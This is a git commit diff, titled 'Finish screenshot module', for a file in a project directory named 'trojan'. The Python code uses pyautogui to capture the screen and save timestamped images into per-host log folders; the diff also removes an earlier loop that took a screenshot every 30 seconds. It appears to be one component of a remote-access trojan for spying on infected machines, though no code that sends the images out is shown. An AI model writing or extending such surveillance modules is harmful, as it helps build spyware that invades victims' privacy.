0d69752563c5de534a59599abad27ed83f0cafcc
jefcrb <jef@ssicc.be>
2023-05-29 10:30:42 +0200

    Finish screenshot module

--- trojan/mod2_screenshotter.py
+++ trojan/mod2_screenshotter.py
@@ -1,21 +1,17 @@
 import os
-import asyncio
 import pyautogui as pg
+from datetime import datetime
 
 class Screenshotter:
     def __init__(self, host_id):
-        self.should_run = True
         self.host_id = host_id
     
-    async def start(self):
-        while self.should_run:
-            await self.take_ss()
-            await asyncio.sleep(30)
-    
-    async def take_ss(self):
+    def take_ss(self):
         script_dir = os.path.dirname(os.path.realpath(__file__))
         ss_path = os.path.join(script_dir, "..", "logs", self.host_id, 'screenshots')
-        pg.screenshot().save(ss_path)
-
-    def stop(self):
-        self.should_run = False
+        
+        timestamp = datetime.now().strftime("%d-%m-%Y_%H-%M-%S")
+        
+        screenshot_name = f"{timestamp}.png"
+        screenshot_path = os.path.join(ss_path, screenshot_name)
+        pg.screenshot().save(screenshot_path)
